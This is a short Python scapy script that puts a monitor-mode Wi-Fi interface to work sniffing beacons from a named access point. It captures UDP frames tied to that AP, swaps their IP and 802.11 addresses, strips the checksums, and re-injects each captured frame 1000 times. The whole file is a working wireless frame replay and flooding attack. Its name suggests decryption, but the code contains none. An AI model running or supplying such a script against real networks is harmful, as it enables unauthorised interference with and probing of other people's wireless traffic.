from scapy.all import RadioTap, Dot11FCS, LLC, Dot11QoS, Dot11Beacon, Dot11WEP, sniff, Dot11, ls, UDP, IP, send, sendp, sr, srp, FlagsField
import sys

if len(sys.argv) < 3:
    print('Usage: python3 sniff_decypher.py [AP_NAME] [Sniff count]')
    exit(1)

'''
First step: start sniffing the beacon
and find information about it
'''
AP_NAME = bytes(sys.argv[1], encoding='utf-8')
beacons = []

def sniff_beacons(pkt):
    global beacons
    if Dot11Beacon in pkt:
        try:
            if pkt.info == AP_NAME:
                beacons.append(pkt)
        except Exception as e:
            print(e)

sniff(count=150, iface="wlan0mon", prn=sniff_beacons)
AP_INFO = {
    'name': AP_NAME,
    'mac': beacons[0].addr2,
    'full_beacon': beacons[0]
}

'''
Capture a frame
'''
client_data = []
def sniff_client(pkt):
    global AP_INFO
    if UDP in pkt:
        if (pkt.addr1 == AP_INFO['mac'] or pkt.addr2 == AP_INFO['mac'] or pkt.addr3 == AP_INFO['mac'] or pkt.addr4 == AP_INFO['mac']):
            print(pkt.addr1, pkt.addr2, pkt.addr3, pkt.addr4)
            client_data.append(pkt)

sniff(count=int(sys.argv[2]), iface='wlan0mon', prn=sniff_client)

for cd in client_data:
    cd[IP].src, cd[IP].dst = cd[IP].dst, cd[IP].src
    cd[Dot11FCS].addr1, cd[Dot11FCS].addr3 = cd[Dot11FCS].addr3, cd[Dot11FCS].addr1

    del cd[Dot11FCS].fcs
    del cd[IP].chksum
    del cd[UDP].chksum

    sendp(cd, iface='wlan0mon', count=1000)
